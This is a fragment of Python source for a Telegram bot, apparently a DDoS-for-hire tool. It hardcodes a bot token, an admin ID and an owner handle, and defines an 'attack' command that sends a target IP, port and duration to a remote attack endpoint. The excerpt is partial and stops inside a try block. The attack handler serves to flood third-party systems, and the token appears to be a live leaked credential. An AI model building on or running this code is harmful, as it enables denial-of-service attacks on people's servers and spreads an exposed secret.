...
TELEGRAM_TOKEN = "8237142456:AAG4Zn2OdWzkpxkeT26Sb5vltG8kkE_6TDM"
ADMIN_ID = 1337204350
BOT_OWNER = "@LSR_RAJPUT"
...
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    url = "https://hingoli.io/soul/65327903044469/"
    params = {'ip': ip, 'port': port, 'time': time_s}

    try:
        headers = {'User-Agent': 'TG-LSR_RAJPUT'}
